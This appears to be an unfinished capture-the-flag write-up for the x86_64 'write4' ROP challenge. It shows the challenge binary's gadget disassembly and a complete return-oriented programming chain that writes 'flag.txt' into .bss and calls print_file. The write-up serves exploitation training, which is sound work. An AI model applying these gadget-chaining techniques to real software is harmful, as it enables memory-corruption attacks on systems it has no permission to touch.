# write4

In this challenge, the objective is to achieve an arbitrary write, with the final goal being
to send the `flag.txt` string to the `print_file` function.

## x86_64:
```asm
[24] .bss              NOBITS           0000000000601038  00001038
    0000000000000008  0000000000000000  WA       0     0     1

0000000000400510 <print_file@plt>:

0000000000400628 <usefulGadgets>:
  400628:	4d 89 3e         mov    QWORD PTR [r14],r15
  40062b:	c3               ret

0000000000400690 <__libc_csu_init + 0x60>:
  400690:	41 5e            pop    r14
  400692:	41 5f            pop    r15
  400694:	c3               ret

0000000000400693 <__libc_csu_init + 0x63>:
  400693:	5f               pop    rdi
  400694:	c3               ret
```
With the provided gadgets, we have a write `r15` value at address `r14`.
The `__libc_csu_init` function gives us a pop chain that finishes by a pop of `r14` and `r15`.
I used the same trick as on the first challenge, chopping one byte off the `pop r15` to have
a `pop rdi` at disposal.   
We can also see that the bss section is 8 bytes long, perfect to store our `flag.txt` string,
and we have access to its address that will never change.
The final exploit is: pop the bss address and `flag.txt` as `r14` and `r15`, jump to the
store gadget, then pop bss address into `rdi` and finally jump to the print_file PLT entry.
```
┌─────────────────────────┐
│ 0x400690                │ <- pop r14; pop r15; ret
├─────────────────────────┤
│ 0x601038                │ <- BSS
├─────────────────────────┤
│ "flag.txt"              │ <- String literal
├─────────────────────────┤
│ 0x400628                │ <- mov QWORD PTR [r14], r15; ret
├─────────────────────────┤
│ 0x400693                │ <- pop rdi; ret
├─────────────────────────┤
│ 0x601038                │ <- BSS
├─────────────────────────┤
│ 0x400510                │ <- print_file
├─────────────────────────┤
│ ...                     │
```
## x86:

## ARMv5:
